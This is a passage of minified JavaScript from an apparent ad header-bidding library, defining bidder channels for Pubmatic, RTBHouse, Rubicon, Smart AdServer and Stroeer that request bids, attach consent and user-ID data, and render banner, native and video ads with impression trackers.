        g ? f.impTrackers = g : this.track.doError("Criteo xhr native - no imp trackers"), r(new AdTrack.MediaTypes.Native(f, this.track.errorReporting));
      } else this.track.passback(this.definition, this.chd);
    }
  };
}, function (t, e) {
  AdTrack.PubmaticHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.accountId = this.chd.accountId || AdTrack.Config.getAccountId("pubmatic"), this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.PubmaticHelper(t, e, i, this.accountId), this.MTsupport = !0;
  }, AdTrack.PubmaticHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.BANNER, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
            var e = t.seatbid[0].bid[0];
            this.adData = e.adm, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
            var r = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.adm,
                  type: "content"
                }
              },
              n = new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
            i(n);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.PubmaticHBNativeChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.accountId = this.chd.accountId || AdTrack.Config.getAccountId("pubmatic"), this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.PubmaticHelper(t, e, i, this.accountId), this.MTsupport = !0;
  }, AdTrack.PubmaticHBNativeChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.NATIVE, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (r) {
          if (r && r.seatbid && r.seatbid[0] && r.seatbid[0].bid && r.seatbid[0].bid[0]) {
            var n = r.seatbid[0].bid[0];
            this.adData = n;
            try {
              var s = JSON.parse(n.adm),
                a = this.processResult(s, t, e ? e.normal : null);
              a ? i(a) : this.track.passback(this.definition, this.chd);
            } catch (t) {
              this.track.doError("pubmatic native - " + t.message, "debug"), this.track.passback(this.definition, this.chd);
            }
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    isAdValidForRender: function (t, e) {
      var i = e ? e.options.nativeOptions : this.definition.options.nativeOptions,
        r = t.title.length,
        n = t.description.length,
        s = t.image.width,
        a = t.image.height,
        o = s / a;
      if (!t.image || !t.title) return this.track.doError("[" + this.chd.tag + "] Insufficient data received (img:" + !!t.image + "|title:" + !!t.title + ")"), !1;
      if (i) {
        var d = i.maxTitleLength || i.maxTextLength,
          c = i.maxDescLength || i.maxTextLength;
        if (r > 80 && !d) return this.track.doError("pubmatic native - possible title overflow (" + r + "), style: " + e.name, "debug"), !1;
        if (n > 150 && !c) return this.track.doError("pubmatic native - possible description overflow (" + n + "), style: " + e.name, "debug"), !1;
        if (i.imgWidth && i.imgHeight) {
          var h = i.imgWidth,
            l = i.imgHeight,
            u = h / l;
          if (!(u < 1.5 ? o >= u / 1.1 && o <= u / .9 : o >= u / 1.15 && o <= u / .85)) return this.track.doError("pubmatic native - image not optimal, img [" + s + ", " + a + "], optimal [" + h + ", " + l + "], style: " + e.name, "debug"), !1;
        }
      } else this.track.doError("No native options included, style: " + e.name);
      return !0;
    },
    parseAssets: function (t) {
      var e = {};
      try {
        t.forEach(function (t) {
          var i = {
              0: "title",
              1: "data",
              2: "img",
              3: "img",
              4: "data",
              5: "data"
            }[t.id],
            r = {
              0: "title",
              1: "cta",
              2: "favicon",
              3: "image",
              4: "description",
              5: "advertiser"
            }[t.id],
            n = t[i];
          n && (e[r] = n.text || n.value || {
            url: n.url,
            width: n.w,
            height: n.h
          });
        });
      } catch (t) {}
      return e;
    },
    processResult: function (t, e, i) {
      var r = t ? t.native : null;
      if (!r || !r.assets || !r.link) return !1;
      var n = new AdTrack.AdSet();
      n.setStyle(i);
      var s = new AdTrack.AdChoices();
      s.setPromoClickUrl(this.chd.url), s.setPromoText(this.chd.title ? this.chd.title : "Reklama"), s.setOptional(!0), n.addAdChoices(s);
      var a = new AdTrack.TextAd(),
        o = r.link,
        d = o.clicktrackers || void 0,
        c = r.imptrackers || void 0,
        h = this.parseAssets(r.assets);
      if (!this.isAdValidForRender(h, i)) return !1;
      var l = h.image,
        u = h.favicon;
      a.addText(h.title, h.description), l && a.addScreenshot(l.url, l.width, l.height, l.url);
      var p = h.cta ? h.cta : "Navštívit stránku",
        f = h.advertiser ? h.advertiser : "",
        g = "";
      u && u.url && (g = u.url);
      var m = !0 === this.definition.test ? "" : o.url;
      a.setClickTrackers(d), a.setClickUrl(m), a.setVisibleUrl(""), a.setAdUrl(""), a.setCta(p), a.setFavicon(g), a.setCompanyName(f), a.done(), n.addAd(new AdTrack.PubmaticAd(n, a));
      var k = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
        b = {
          chd: this.chd,
          ad: {
            type: "tcproxy",
            data: {
              adSet: n,
              tc: k
            }
          },
          style: i,
          count: 1,
          impTrackers: c
        };
      return new AdTrack.MediaTypes.Native(b, this.track.errorReporting);
    }
  };
}, function (t, e) {
  AdTrack.RTBHouseHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.RTBHouseHelper(t, e, i), this.MTsupport = !0;
  }, AdTrack.RTBHouseHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.BANNER, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t[0]) {
            var e = t[0];
            e.w && e.h && (this.chd.width = e.w, this.chd.height = e.h);
            var r = e.adm;
            this.adData = r;
            var n = {
                chd: this.chd,
                width: this.chd.width,
                height: this.chd.height,
                ad: {
                  data: r,
                  type: "content"
                }
              },
              s = new AdTrack.MediaTypes.Banner(n, this.track.errorReporting);
            i(s);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.RTBHouseHBNativeChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.RTBHouseHelper(t, e, i), this.MTsupport = !0;
  }, AdTrack.RTBHouseHBNativeChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.NATIVE, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      if (!e || !e.normal) return this.track.doError("Undefined style for " + this.chd.tag), void this.track.passback(this.definition, this.chd);
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (r) {
          if (r && r[0]) {
            var n = r[0];
            this.adData = n;
            try {
              var s = JSON.parse(n.adm),
                a = this.processResult(s, t, e);
              a ? i(a) : this.track.passback(this.definition, this.chd);
            } catch (t) {
              this.track.doError("rtbhouse native - " + t.message, "debug"), this.track.passback(this.definition, this.chd);
            }
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    isAdValidForRender: function (t, e) {
      var i = e ? e.options.nativeOptions : this.definition.options.nativeOptions,
        r = t.title.length,
        n = t.description.length,
        s = t.image.width,
        a = t.image.height,
        o = s / a;
      if (!t.image || !t.title) return this.track.doError("[" + this.chd.tag + "] Insufficient data received (img:" + !!t.image + "|title:" + !!t.title + ")"), !1;
      if (i) {
        var d = i.maxTitleLength || i.maxTextLength,
          c = i.maxDescLength || i.maxTextLength;
        if (r > 80 && !d) return this.track.doError("Rtbhouse native - possible title overflow (" + r + "), style: " + e.name, "debug"), !1;
        if (n > 150 && !c) return this.track.doError("Rtbhouse native - possible description overflow (" + n + "), style: " + e.name, "debug"), !1;
        if (i.imgWidth && i.imgHeight) {
          var h = i.imgWidth,
            l = i.imgHeight,
            u = h / l;
          if (!(u < 1.5 ? o >= u / 1.1 && o <= u / .9 : o >= u / 1.15 && o <= u / .85)) return this.track.doError("Rtbhouse native - image not optimal, img [" + s + ", " + a + "], optimal [" + h + ", " + l + "], style: " + e.name, "debug"), !1;
        }
      } else this.track.doError("No native options included, style: " + e.name);
      return !0;
    },
    parseAssets: function (t) {
      var e = {};
      try {
        t.forEach(function (t) {
          var i = {
              1: "title",
              6: "data",
              3: "img",
              2: "img",
              4: "data",
              5: "data"
            }[t.id],
            r = {
              1: "title",
              6: "cta",
              3: "favicon",
              2: "image",
              4: "description",
              5: "advertiser"
            }[t.id],
            n = t[i];
          n && (e[r] = n.text || n.value || {
            url: n.url,
            width: n.w,
            height: n.h
          });
        });
      } catch (t) {}
      return e;
    },
    processResult: function (t, e, i) {
      var r = t ? t.native : null;
      if (!r || !r.assets || !r.link) return !1;
      var n = new AdTrack.AdSet();
      n.setStyle(i);
      var s = new AdTrack.AdChoices();
      s.setPromoClickUrl(this.chd.url), s.setPromoText(this.chd.title ? this.chd.title : "Reklama"), s.setOptional(!0), n.addAdChoices(s);
      var a = new AdTrack.TextAd(),
        o = r.link,
        d = o.clicktrackers || void 0,
        c = r.imptrackers || void 0,
        h = this.parseAssets(r.assets);
      if (!this.isAdValidForRender(h, i)) return !1;
      var l = h.image,
        u = h.favicon;
      a.addText(h.title, h.description), l && a.addScreenshot(l.url, l.width, l.height, l.url);
      var p = h.cta ? h.cta : "Navštívit stránku",
        f = h.advertiser ? h.advertiser : "",
        g = "";
      u && u.url && (g = u.url);
      var m = !0 === this.definition.test ? "" : o.url;
      a.setClickTrackers(d), a.setClickUrl(m), a.setVisibleUrl(""), a.setAdUrl(""), a.setCta(p), a.setFavicon(g), a.setCompanyName(f), a.done(), n.addAd(new AdTrack.RTBHouseAd(n, a));
      var k = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
        b = {
          chd: this.chd,
          ad: {
            type: "tcproxy",
            data: {
              adSet: n,
              tc: k
            }
          },
          style: i,
          count: 1,
          impTrackers: c
        };
      return new AdTrack.MediaTypes.Native(b, this.track.errorReporting);
    }
  };
}, function (t, e) {
  AdTrack.RubiconBannerHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.MTsupport = !0, this.price = null, this.response = null, this.track.shouldCsync("rubicon") && AdTrack.UserSync.addUserSync("rubicon", 52, function () {
      AdTrack.RubiconCSync();
    }.bind(this), this.track.settings), this.accountId = this.chd.accountId || AdTrack.Config.getAccountId("rubicon"), this.external = this.accountId !== AdTrack.Config.getAccountId("rubicon"), this.bidResponse = new AdTrack.Bid(), this.sizesMas = {
      "468x60": 1,
      "728x90": 2,
      "120x90": 5,
      "125x125": 7,
      "120x600": 8,
      "160x600": 9,
      "300x600": 10,
      "200x200": 13,
      "250x250": 14,
      "300x250": 15,
      "336x280": 16,
      "240x400": 17,
      "300x100": 19,
      "980x120": 31,
      "250x360": 32,
      "180x500": 33,
      "980x150": 35,
      "468x400": 37,
      "930x180": 38,
      "750x100": 39,
      "750x200": 40,
      "750x300": 41,
      "2x4": 42,
      "320x50": 43,
      "300x50": 44,
      "300x300": 48,
      "1024x768": 53,
      "300x1050": 54,
      "970x90": 55,
      "970x250": 57,
      "1000x90": 58,
      "320x80": 59,
      "320x150": 60,
      "1000x1000": 61,
      "580x500": 64,
      "640x480": 65,
      "930x600": 66,
      "320x480": 67,
      "1800x1000": 68,
      "320x320": 72,
      "320x160": 73,
      "980x240": 78,
      "980x300": 79,
      "980x400": 80,
      "480x300": 83,
      "300x120": 85,
      "548x150": 90,
      "970x310": 94,
      "970x100": 95,
      "970x210": 96,
      "480x320": 101,
      "768x1024": 102,
      "480x280": 103,
      "250x800": 105,
      "320x240": 108,
      "1000x300": 113,
      "320x100": 117,
      "800x250": 125,
      "200x600": 126,
      "980x600": 144,
      "1000x250": 152,
      "640x320": 156,
      "320x250": 159,
      "250x600": 179,
      "600x300": 195,
      "640x360": 198,
      "640x200": 199,
      "1030x590": 213,
      "980x360": 214,
      "1x1": 221,
      "320x180": 229,
      "2000x1400": 230,
      "580x400": 232,
      "6x6": 234,
      "2x2": 251,
      "480x820": 256,
      "400x600": 257,
      "500x200": 258,
      "998x200": 259,
      "970x1000": 264,
      "1920x1080": 265,
      "1800x200": 274,
      "320x500": 278,
      "320x400": 282,
      "640x380": 288,
      "500x1000": 548,
      "980x480": 550,
      "300x200": 552,
      "640x640": 558,
      "300x431": 562,
      "320x431": 564,
      "320x300": 566,
      "300x150": 568,
      "300x125": 570,
      "250x350": 572,
      "620x891": 574,
      "610x877": 576,
      "980x552": 578,
      "505x656": 580
    }, this.actualSizes = {};
  }, AdTrack.RubiconBannerHBChannel.prototype = {
    report: function () {
      return this.response ? this.response : "";
    },
    bid: function (t, e) {
      var i = "https:" === location.protocol ? "1" : "0",
        r = [window.screen.width, window.screen.height].join("x"),
        n = this.chd.width + "x" + this.chd.height,
        s = this.sizesMas[n];
      if (!s) return this.track.doError("Unsupported dimension (" + n + ") in rubicon adapter"), void (t && t(null, null));
      this.actualSizes[s] = [this.chd.width, this.chd.height];
      for (var a = this.chd.sizes ? this.chd.sizes : [], o = [], d = 0; d < a.length; d++) {
        var c = a[d][0] + "x" + a[d][1],
          h = this.sizesMas[c];
        h ? (o.push(h), this.actualSizes[h] = a[d]) : this.track.doError("Unsupported dimension (" + c + ") in rubicon adapter");
      }
      var l = e.split("-");
      2 !== l.length && this.track.doError("Wrong format for key, should be: [site_id]-[zone-id]");
      var u = {
          account_id: this.accountId,
          site_id: l[0],
          zone_id: l[1],
          size_id: s,
          alt_size_ids: o.join(","),
          p_pos: "atf",
          rf: AdTrack.url,
          p_screen_res: r,
          rp_floor: this.chd.bidFloor ? this.chd.bidFloor : .01,
          rp_secure: i,
          slots: 1,
          rand: Math.random()
        },
        p = this.track.getSupplyChain(!0);
      if (p && !this.external && (u.rp_schain = p), AdTrack.UserID && !this.track.getOption("disableUserId")) for (var f = AdTrack.UserID.getAllUserIdsAsEids(), g = 0; g < f.length; g++) {
        var m = f[g];
        if ("adserver.org" === m.source ? (u.tpid_tdid = m.uids[0].id, u["eid_adserver.org"] = m.uids[0].id) : "liveintent.com" === m.source ? (u["tpid_liveintent.com"] = m.uids[0].id, u["eid_liveintent.com"] = m.uids[0].id, m.ext && Array.isArray(m.ext.segments) && m.ext.segments.length && (u["tg_v.LIseg"] = m.ext.segments.join(","))) : "liveramp.com" === m.source ? u.x_liverampidl = m.uids[0].id : "id5-sync.com" === m.source ? u["eid_id5-sync.com"] = `${m.uids[0].id}^${m.uids[0].atype}^${m.uids[0].ext && m.uids[0].ext.linkType || ""}` : u[`eid_${m.source}`] = `${m.uids[0].id}^${m.uids[0].atype || ""}`, !u.ppuid) {
          var k = null;
          m.uids.forEach(function (t) {
            t.ext && "ppuid" === t.ext.stype && (k = t);
          }), k && k.id && (u.ppuid = k.id);
        }
      }
      var b = !1,
        v = !1,
        A = null;
      AdTrack.CMP && (A = AdTrack.CMP.getConsentData()), A && (b = !0, void 0 !== A.gdprApplies && (u.gdpr = A.gdprApplies ? 1 : 0), A.consentString && (u.gdpr_consent = A.consentString));
      var T = null;
      AdTrack.USP && (T = AdTrack.USP.getConsentData()), T && T.consentString && (v = !0, u.us_privacy = T.consentString), (b || v) && this.track.evBidConsent(this.definition, this.chd, b, v);
      var y = "https://fastlane.rubiconproject.com/a/api/fastlane.json?" + Object.keys(u).map(function (t) {
          return [t, u[t]].map(encodeURIComponent).join("=");
        }).join("&"),
        w = this;
      AdTrack.Ajax.request({
        label: "Rubicon bid",
        url: y,
        json: !0,
        async: !this.definition.options.noAsync,
        timeout: this.chd.timeout || 800,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (e) {
        if ("ok" === e.status && e.ads && e.ads[0] && "ok" === e.ads[0].status) {
          var i = e.ads[0],
            r = w.actualSizes[i.size_id];
          if (!r) return w.track.doError("Unexpected size_id (" + i.size_id + ") in response (rubicon)"), void (t && t(null, e));
          w.chd.width = r[0], w.chd.height = r[1], w.price = AdTrack.Price.create(i.cpm, AdTrack.Price.USD), w.bidResponse.setCreativeId(i.creative_id), w.bidResponse.setWidth(r[0]), w.bidResponse.setHeight(r[1]), w.bidResponse.setPrice(w.price);
          try {
            var n = JSON.stringify(e);
            AdTrack.Utils.testAd(n, w.definition.options.contentBlackList || []) && (w.chd.logs && w.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(w.track.server, w.chd.logs.blocked_creative, w.chd.tag, i.creative_id || "", "", i.cpm, n), w.price = null);
          } catch (t) {}
        } else w.price = null;
        w.response = e, t && t(w.price, e);
      }).fail(function (e, i) {
        i ? w.track.evBidTimeout(w.definition, w.chd) : w.track.evBidError(w.definition, w.chd), w.price = null, t && t(null, null);
      }).send();
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.ads && t.ads[0] && "ok" === t.ads[0].status) {
            var e = t.ads[0],
              r = Number(e.size_id),
              n = this.getCreative(e.script, e.impression_id),
              s = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  type: "content",
                  data: n
                }
              };
            "string" != typeof this.chd.flag || !this.chd.flag.match(/custom/i) || 230 !== r && 256 !== r || (s.externalRender = !0);
            var a = new AdTrack.MediaTypes.Banner(s, this.track.errorReporting);
            i(a);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    getCreative: function (t, e) {
      return "<html><head><script type='text/javascript'>inDapIF=true;<\/script></head><body style='margin : 0; padding: 0;'>\x3c!-- Rubicon Project Ad Tag --\x3e<div data-rp-impression-id='" + e + "'><script type='text/javascript'>" + t + "<\/script></div></body></html>";
    }
  };
}, function (t, e) {
  AdTrack.SmartAdServerHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.SmartHelper(t, e, i), this.MTsupport = !0;
  }, AdTrack.SmartAdServerHBChannel.prototype = {
    report: function () {
      return this.response ? this.response.ad : "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.ad) {
            this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
            var e = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: t.ad,
                  type: "content"
                }
              },
              r = new AdTrack.MediaTypes.Banner(e, this.track.errorReporting);
            i(r);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.SmartAdServerHBNativeChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.SmartHelper(t, e, i), this.MTsupport = !0;
  }, AdTrack.SmartAdServerHBNativeChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.ad) {
            this.chd.width = t.width ? t.width : this.chd.width, this.chd.height = t.height ? t.height : this.chd.height;
            try {
              var r = t.ad.indexOf("{"),
                n = JSON.parse(t.ad.substr(r).replace(/,(\s)?]/g, "]"));
            } catch (e) {
              n = !1, this.chd.logs && this.chd.logs.creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.creative, this.chd.tag, t.creativeId || "", "", t.cpm, t.ad);
            }
            if (n) {
              if (n.imgUrl && n.title) {
                this.adData = n;
                var s = new AdTrack.AdSet();
                s.setStyle(e);
                var a = n.privacy ? n.privacy : "",
                  o = new AdTrack.AdChoices();
                o.setPromoClickUrl(a || this.chd.url), a && o.setPromoIcon("//" + this.track.server + "/icon/oba.png"), o.setPromoText(this.chd.title), o.setOptional(!a), s.addAdChoices(o);
                var d = new AdTrack.TextAd(),
                  c = t.adUrl ? t.adUrl : "";
                d.addScreenshot(n.imgUrl), d.addText(n.title, n.data), d.setClickUrl(n.clickUrl), d.setAdUrl(c), d.done(), s.addAd(new AdTrack.SmartAd(s, d));
                var h = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting);
                if (this.track.renderer.on("impress", function (t, e) {
                  n.eventTrackers && n.eventTrackers.length > 0 && n.eventTrackers.forEach(function (t) {
                    if (t.event && t.method && t.url) if (t.event > 4 || t.method > 2) this.track.doError("Cant handle custom tracker - event: " + t.method.event + ", method: " + t.method);else if (1 === t.method && (new Image().src = t.url), 2 === t.method) {
                      var e = document.createElement("script");
                      document.querySelector("head").appendChild(e), e.onerror = function () {
                        AdTrack.adblock || this.track.doError("[" + this.chd.tag + "] Failed to load js tracker");
                      }.bind(this), e.src = t.url;
                    }
                  }.bind(this));
                }.bind(this)), n.impPixel) {
                  var l = AdTrack.Utils.time();
                  n.impPixel.forEach(function (t) {
                    t = t.replace("%5btimestamp%5d", l), new Image().src = t;
                  });
                }
                n.imptrackers && n.imptrackers.forEach(function (t) {
                  new Image().src = t;
                });
                var u = {
                    chd: this.chd,
                    ad: {
                      type: "tcproxy",
                      data: {
                        adSet: s,
                        tc: h
                      }
                    },
                    style: e,
                    count: 1
                  },
                  p = new AdTrack.MediaTypes.Native(u, this.track.errorReporting);
                i(p);
              } else this.track.doError("[" + this.chd.tag + "] Insufficient data received (img:" + !!n.imgUrl + "|title:" + !!n.title + ")"), this.track.passback(this.definition, this.chd);
            } else this.track.doError("[" + this.chd.tag + "] Could not parse response"), this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.SmartHBVideoChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.prebidVideo = this.definition.options.hb && (this.definition.options.hb.prebidVideo || this.definition.options.customPrebidVideo), this.MTsupport = !0;
  }, AdTrack.SmartHBVideoChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.createData(e),
        r = this.__onSuccess.bind(this),
        n = this.__onError.bind(this);
      AdTrack.Ajax.request({
        label: "Smart video bid",
        url: "https://prg.smartadserver.com/prebid/v1",
        method: "POST",
        data: JSON.stringify(i),
        json: !0,
        async: !this.definition.options.noAsync,
        timeout: this.chd.timeout || 800,
        headers: {},
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (i) {
        r(i, e, t);
      }).fail(function (e, i) {
        n(e, i, t);
      }).send();
    },
    createData: function (t) {
      var e = t.split("-");
      3 !== e.length && this.track.doError("Wrong format for key, should be: [site_id]-[page_id]-[format_id]");
      var i = AdTrack.Utils.simpleStringGenerator(14),
        r = AdTrack.Utils.simpleStringGenerator(14),
        n = {
          siteid: e[0],
          pageid: e[1],
          formatid: e[2],
          currencyCode: "EUR",
          bidfloor: this.chd.bidFloor || 0,
          bidId: i,
          transactionId: r,
          tagId: this.track.unitID.getName(),
          timeout: 600,
          prebidVersion: "7.18.0",
          pageDomain: AdTrack.Utils.getDomain(this.definition.info),
          ckid: 0,
          mediatype: "video",
          isVideo: !0,
          videoData: {
            videoProtocol: 6,
            playerWidth: this.chd.width || 640,
            playerHeight: this.chd.height || 480,
            adBreak: 1
          }
        },
        s = !1,
        a = !1,
        o = null;
      AdTrack.CMP && (o = AdTrack.CMP.getConsentData()), o && o.consentString && (s = !0, n.gdpr = o.gdprApplies ? 1 : 0, n.gdpr_consent = o.consentString, n.addtl_consent = o.addtlConsent);
      var d = null;
      AdTrack.USP && (d = AdTrack.USP.getConsentData()), d && d.consentString && (a = !0, n.us_privacy = d.consentString), (s || a) && this.track.evBidConsent(this.definition, this.chd, s, a);
      var c = this.track.getSupplyChain(!0);
      if (c && (n.schain = c), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var h = AdTrack.UserID.getAllUserIdsAsEids();
        h && (n.eids = h);
      }
      return n;
    },
    __onSuccess: function (t, e, i) {
      this.response = t, this.price = null;
      if (t && !t.isNoAd && (!this.prebidVideo || this.prebidVideo && t.ad)) {
        var r = t,
          n = AdTrack.Utils.isBlackListedAds(r.ad),
          s = AdTrack.Utils.testAd(r.ad, this.definition.options.contentBlackList || []);
        !1 === n && !1 === s ? r.currency === this.chd.currency ? (this.price = AdTrack.Price.create(r.cpm, this.chd.currency, null), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(r.creativeId), this.bidResponse.setWidth(r.width ? r.width : this.chd.width), this.bidResponse.setHeight(r.height ? r.height : this.chd.height), this.prebidVideo && (this.bidResponse.setVideoVastXML(r.ad), this.bidResponse.setVideoImpUrl(AdTrack.Utils.getVideoImpUrl(this.track.unitID, e, this.chd, this.track.server)))) : this.track.doError("Channel " + this.chd.tag + " responsed with wrong currency: " + r.currency) : (n && this.track.doError("Blocked Smart creative (" + r.creativeId + ") from " + n, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, r.creativeId || "", r.dealId, r.cpm, r.ad), i && i(null, null));
      }
      this.userSync(t), i && i(this.price, this.response);
    },
    __onError: function (t, e, i) {
      e ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, i && i(null, null);
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && !t.isNoAd) {
            this.chd.width = t.width ? t.width : this.chd.width, this.chd.height = t.height ? t.height : this.chd.height;
            var e = t.ad || t.adUrl,
              r = t.ad ? "vast_content" : "vast_url";
            this.adData = e;
            var n = AdTrack.MediaTypes.createVideoSettings(this.track, this.chd, e, r),
              s = new AdTrack.MediaTypes.Video(n, this.track.errorReporting);
            i(s);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    userSync: function (t) {
      if (t) {
        var e = t.cSyncUrl,
          i = t.dspPixels;
        this.track.shouldCsync("smart") && AdTrack.UserSync.addUserSync("smart", 45, function () {
          null != e ? AdTrack.Utils.csyncFrame(e) : void 0 !== i && i.forEach(function (t) {
            AdTrack.Utils.firePixel(t);
          });
        }, this.track.settings);
      }
    }
  };
}, function (t, e) {
  var i;
  AdTrack.StroeerHbChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]], this.bidResponse = new AdTrack.Bid(), this.track.shouldCsync("stroeer-hb") && AdTrack.UserSync.addUserSync("stroeer-hb", 136, function () {
      AdTrack.StroeerHbCSync();
    }.bind(this), this.track.settings), this.MTsupport = !0;
  }, AdTrack.StroeerHbChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      if (AdTrack.url.match(/https:\/[a-z]/)) return this.track.doError("Stroeer invalid url"), void t(null, null);
      var i = this.createData(e),
        r = function (e) {
          if (this.response = e, e.bids && e.bids.length > 0) {
            if (!e.bids[0]) return this.track.doError("Channel " + this.chd.tag + " responded with unknown response."), void (t && t(null, null));
            var i = e.bids[0],
              r = AdTrack.Utils.isBlackListedAds(i.ad),
              n = AdTrack.Utils.testAd(i.ad, this.definition.options.contentBlackList || []);
